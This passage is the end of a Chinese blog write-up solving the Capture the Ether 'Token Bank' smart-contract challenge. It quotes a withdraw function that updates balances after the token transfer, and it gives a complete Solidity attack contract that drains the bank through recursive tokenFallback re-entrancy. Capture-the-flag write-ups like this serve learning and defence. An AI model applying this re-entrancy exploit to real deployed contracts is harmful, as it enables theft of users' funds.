+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function withdraw(uint256 amount) public &#123;</span><br><span class="line">    require(balanceOf[msg.sender] &gt;&#x3D; amount);</span><br><span class="line"></span><br><span class="line">    require(token.transfer(msg.sender, amount));</span><br><span class="line">    &#x2F;&#x2F; balance decreased after recipient is notified</span><br><span class="line">    &#x2F;&#x2F; re-entrancy issue</span><br><span class="line">    balanceOf[msg.sender] -&#x3D; amount;</span><br><span class="line">&#125;</span><br><span class="line">function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;</span><br><span class="line">    require(balanceOf[msg.sender] &gt;&#x3D; value);</span><br><span class="line"></span><br><span class="line">    balanceOf[msg.sender] -&#x3D; value;</span><br><span class="line">    balanceOf[to] +&#x3D; value;</span><br><span class="line">    emit Transfer(msg.sender, to, value);</span><br><span class="line"></span><br><span class="line">    if (isContract(to)) &#123;</span><br><span class="line">        ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>challenge.withdraw =&gt; token.transfer =&gt; msg.sender.tokenFallback() =&gt; …</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">    TokenBankChallenge public bank &#x3D; TokenBankChallenge(0x5e3D261A631c41659b37168199d9B8020a1d976c);</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        SimpleERC223Token token &#x3D; SimpleERC223Token(bank.token());</span><br><span class="line"></span><br><span class="line">        uint256 balance &#x3D; token.balanceOf(this);</span><br><span class="line">        require(balance &#x3D;&#x3D; token.balanceOf(address(bank)));</span><br><span class="line">        require(balance + token.balanceOf(address(bank)) &#x3D;&#x3D; token.totalSupply());</span><br><span class="line"></span><br><span class="line">        token.transfer(address(bank), balance);</span><br><span class="line">        require(token.balanceOf(this) &#x3D;&#x3D; 0);</span><br><span class="line">        require(balance &#x3D;&#x3D; bank.balanceOf(this));</span><br><span class="line">        require(token.balanceOf(address(bank)) &#x3D;&#x3D; token.totalSupply());</span><br><span class="line"></span><br><span class="line">        bank.withdraw(balance);</span><br><span class="line">        require(bank.isComplete() &#x3D;&#x3D; true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenFallback(address from, uint256, bytes) public &#123;</span><br><span class="line">        SimpleERC223Token token &#x3D; SimpleERC223Token(bank.token());</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; address(token));</span><br><span class="line"></span><br><span class="line">        if (from &#x3D;&#x3D; address(bank)) &#123;</span><br><span class="line">            if (token.balanceOf(address(bank)) &gt; 0) &#123;</span><br><span class="line">                uint256 balance &#x3D; bank.balanceOf(this);</span><br><span class="line">                bank.withdraw(balance);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>需要先用player账户withdraw出来，再转移到部署的攻击账户</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Zpano
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://zpano.cn/2022/03/10/34/" title="Capture the Ether wp">https://zpano.cn/2022/03/10/34/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/" rel="tag"># 区块链安全</a>
+              <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/" rel="tag"># 智能合约安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/11/12/33/" rel="prev" title="从一道智能合约赛题看Poly Network 事件">
+                  <i class="fa fa-chevron-left"></i> 从一道智能合约赛题看Poly Network 事件
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+      
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Zpano</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">213k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:14</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+
+  
+
+  
+      <script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              const target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    const script = document.createElement('script');
+    script.src = '//cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-mml-chtml.js';
+    script.defer = true;
+    document.head.appendChild(script);
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.typesetClear();
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
